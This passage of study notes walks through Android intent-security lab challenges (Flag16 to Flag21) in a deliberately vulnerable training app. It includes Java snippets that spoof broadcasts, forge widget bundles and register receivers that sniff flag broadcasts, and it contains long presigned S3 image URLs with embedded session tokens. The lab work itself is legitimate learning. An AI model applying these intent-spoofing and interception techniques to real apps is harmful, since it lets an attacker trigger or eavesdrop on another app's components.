r4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=1aeab5f2dc365239c6bcefb247f033033256de81f5e8dd3c83f89d47b155cc81&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
There is string flagsecret which is being compared to the intent we are going to send from our attack app with label flag so we can send the intent through broadcast by specifying the package and class
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
        intent.putExtra("flag","give-flag-16");
        sendBroadcast(intent);
    }
```
<empty-block/>
### Flag17
Broadcasts can be of 2 types of dynamic broadcast receiver and a static broadcast receiver which we can implement by declaring in android manifest  
The difference between both of them are dynamic receivers only work when the app is active but static registers work even when the app is closed and can receive broadcasts any time and system can start the app
Static registers increase the scope of vulnerabilities 
startActivityForResult() is similar to sendOrderedBroadcast() isOrderedBroadcast() method is similar to getCallingActivity() and onOrderedBroadcast() is similar to onactivityresult() and finally setresult() is similar to setResultData() or setResultsExtra()
<table>
<tr>
<td>**Feature**</td>
<td>**Activity (startActivityForResult)**</td>
<td>**Ordered Broadcast (sendOrderedBroadcast)**</td>
</tr>
<tr>
<td>**The Initial Call**</td>
<td>`startActivityForResult()`</td>
<td>`sendOrderedBroadcast()`</td>
</tr>
<tr>
<td>**Checking the Link**</td>
<td>`getCallingActivity()` (Checks who is waiting for the result)</td>
<td>`isOrderedBroadcast()` (Checks if the sender allows a return result)</td>
</tr>
<tr>
<td>**Receiving the Request**</td>
<td>`onCreate()`</td>
<td>**`onReceive()`** (Corrected from `onOrderedBroadcast`)</td>
</tr>
<tr>
<td>**Sending the Data Back**</td>
<td>`setResult()`</td>
<td>`setResultData()` or `setResultExtras()`</td>
</tr>
<tr>
<td>**Catching the Result**</td>
<td>`onActivityResult()`</td>
<td>`onReceive()` (for the final `resultReceiver` defined in the sender)</td>
</tr>
</table>
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/70b86511-c55d-47aa-afb5-e90923a22136/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=5e6915e4c0a22e343b09fd931203cb6f322ba2cdfc21e8b6fc1f9a9020d0abb8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
If you observe closely the target app has an receiver so we just simply connect to the receiver
The above code snippet is form flag17 activity it is using onReceive function to check if there are any broadcasts are incoming if yes then it will check is this an onOrderedBroadcast using the method isOrderedBroadcast() if yes then it will check the intent coming through broadcast  
There is a flagsecret which is hardcoded and being compared to our intent
```java
Intent intent = new Intent();
intent.putExtra("flag","give-flag-17");
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
sendOrderedBroadcast(intent, null);
```
There are different parameters and values we can pass into the sendOrderBroadcast() method those are
```java
sendOrderedBroadcast(
    intent,           // The intent to broadcast
    null,             // Permission (null = anyone can receive)
    resultReceiver,   // A final BroadcastReceiver that ALWAYS runs at the end
    null,             // A Handler to run the resultReceiver
    Activity.RESULT_OK, // Initial result code
    null,             // Initial result data
    null              // Initial result extras
);
```
### Flag18
In this challenge the target app doesnt have a receiver, but its trying to send info through broadcast so this means we have to set a receiver and we use intent 
In android 8 or above we cant simply create a BroadcastReceiver since it consumes a lot of battery and ram to save so we have to dynamically register a receiver broadcast
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/5f0c03fa-69c3-45fd-8100-68087295f3ed/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=acc2d121a2b43c20682bb0159745dc43d47ec006ba42d0d479a4eba92623b92f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above jadx code of flag18 the target app is sending a broadcast and success method is called when resultcode which came with the broadcast through intent shouldn’t be 0
First tried to use a static receiver just by creating a receiver tag in the manifest with the action io.hextre.broadcast.FREE_FLAG and then sent the resultcode as 42 and then tried to run but the app is simply crashing, the static receiver is just for android 8 or lesser and the new version need to initiate as dynamic receiver and then send the broadcast through the dynamic receiver as shown below
By analysing the code we can see that the app is sending an sendOrderedBroadcast() we can set our required values for result code , request code, flags etc..
```java
BroadcastReceiver receiver = new BroadcastReceiver() {
@Override
public void onReceive(Context context, Intent intent) {
    setResultCode(42);
}
};
registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
```
we use intent filter to say to which broadcast we are going to connect
### Flag19
The below picture represents the success Flag19 Activity 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/708fb866-a32a-4f84-8074-b01f9e55e02d/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=b9d1a102f6db296f4028ca943c5dc9e822e35acf504439cdca8f7cd7eec72e28&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The below ss represents the success function of Flag19widget
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/0530e24e-96d6-428f-ab1a-c44f2bb88dc7/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=2c1da87ea6e868ac99dd07facb15048cb905d5372d2e3149f856db0fa3cae4f6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
<empty-block/>
In the challenge the description in the video says that intent surface attack app has a widget showing the number flags solved so far and that can be also refreshed and update on click on the widget.
<empty-block/>
How the code works:
When we click on the widget of Intent surface attack app the widget sends a broadcast using an action APPWIDGET_UPDATE and while using AppWidgetManager we can get the size of the widget which is passed into updatewidget function which updates the data fetching in from Solved preferences which contains the data of solved flags and display them on the widget again. To call the success the code checks for the widgets max and min which we get from a bundle if it matches with the given value we will get the flag
<empty-block/>
What is a bundle?
A **Bundle** is Android’s specialized "data suitcase," a key-value map designed to transport information across the OS. While it acts like a simple container for primitives (ints, strings) and complex objects, its true power lies in its optimization for **Inter-Process Communication (IPC)**—allowing data to safely travel between different apps or between components within the same app (like Activities and Fragments). It is the backbone of the Android lifecycle, used to "handshake" with the system for widget updates, preserve UI state during screen rotations, and pass arguments to fragments. Just remember its golden rule: it’s meant for small, serialized "metadata," as exceeding its **1MB limit** will cause the system to drop the suitcase and crash your app.
<empty-block/>
There are 2 solutions for this case:
Case1: We can change the widget height using resize button and then click on the widget which call the success method
Case 2: As we previously discussed that the widget sends a broadcast our attacker app creates that broadcast send out bundle instances which contains the exact values the app is expecting for and calls the success activity here we are simply mimicking the widget and we send the intent which contains the bundle named appWidgetOptions and set the actions too 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setAction("APPWIDGET_UPDATE");
        Bundle bundle = new Bundle();
        bundle.putInt("appWidgetMaxHeight", 1094795585);
        bundle.putInt("appWidgetMinHeight", 322376503);
        intent.putExtra("appWidgetOptions", bundle);
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
        sendBroadcast(intent);
    }
```
<empty-block/>
### Flag20
The below ss represents the Flag20Activity
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/9ebfeee5-d51c-42de-9b01-b31d3af529f3/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=c8a432638b66438984886640c0f3e0362683af29155a4a9b23207395220fcac7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
There is an action that is need to be received 
The below ss represents the Flag20receiver which acts when the notification is clicked
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/939f00d9-c964-4c6b-827d-9f6ccefa40e0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=c621af296276d986bcca34bbe934c872a73f0bfa346b6370cb9712ecb89cd349&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
Notifications also use broadcast pending intents in this case the code works in a way that when we click on the flag20 in intent surface attack app it sends a notification and dynamically registers a listener to listen to an action io.hextree.broadcast.GET_FLAG so we create our attack app which can communicate with that app using action saying that he can handle the case 
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setAction("io.hextree.broadcast.GET_FLAG");
        intent.putExtra("give-flag", true);
        sendBroadcast(intent);
    }
```
Along with the intent to reach the success method we need to add few extras which is give-flag string and boolean value to true telling to give the flag 
In normal case when we click the notification flag20receiver receives it since it has the action io.hextree.broadcast.GET_FLAG and the give-flag is set to false so it wont return anything
### Flag21
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/e77d404c-d9a6-40c2-9125-bb1a25a70f31/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=04657c62ed859b7f911ac34bc09b048a13254f511e5e4921a58e376b8af0a313&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
In the above ss represents the code of the flag21 activity in this code it is waiting for a broadcast which contains few data and bundles but it isn't checking any of the data received so we don't need to send any extra data 
After launching this activity we get an notification with a button give flag 
Notifications are also handled by pending intents and broadcasts so when the notification is sent the broadcast triggers  
In the previous flag 20 we have a Flag20Receiver so we didn't need to listen to the broadcast just send the what the receiver needs but now in the case of flag 21 we need to listen to the broadcast because the broadcast contains the flag and we use intent filter saying that i want to listen to those kind of flags
The moment when the flag 21 is started it starts sending its broadcast and when we click on our attack app we receive it while its in mid air and prints it in our logs  and stores the flag in the variable flag
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String flag = intent.getStringExtra("flag");
                Log.d("flag21", flag);
            }
        };
        registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.GIVE_FLAG"));
    }
```
<empty-block/>
### Flag24
